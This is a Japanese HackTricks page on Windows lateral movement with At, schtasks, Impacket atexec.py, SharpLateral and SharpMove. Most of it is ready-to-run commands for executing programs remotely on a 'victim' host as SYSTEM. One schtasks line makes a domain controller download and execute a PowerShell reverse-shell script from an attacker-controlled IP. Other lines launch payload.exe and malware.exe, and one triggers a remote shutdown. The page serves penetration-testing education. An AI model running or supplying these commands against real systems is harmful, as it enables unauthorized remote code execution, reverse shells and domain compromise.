# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## どのように動作するか

At は、ユーザー名/(password/Hash) が分かっているホストでタスクをスケジュールできます。そのため、他のホストでコマンドを実行し、出力を取得するために使用できます。
```
At \\victim 11:00:00PM shutdown -r
```
schtasksを使用する場合、まずタスクを作成してから呼び出す必要があります。
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
**Impacket の `atexec.py`** を使用すると、AT コマンドを利用してリモートシステム上でコマンドを実行できます。これには、対象システムの有効な認証情報（ユーザー名とパスワード、または hash）が必要です。
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
[SharpLateral](https://github.com/mertdas/SharpLateral) も使用できます。
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
[SharpMove](https://github.com/0xthirteen/SharpMove) を利用できます：
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
schtasks と silver tickets の使用についての詳細は、[**こちら**](../active-directory-methodology/silver-ticket.md#host)を参照してください。

{{#include ../../banners/hacktricks-training.md}}
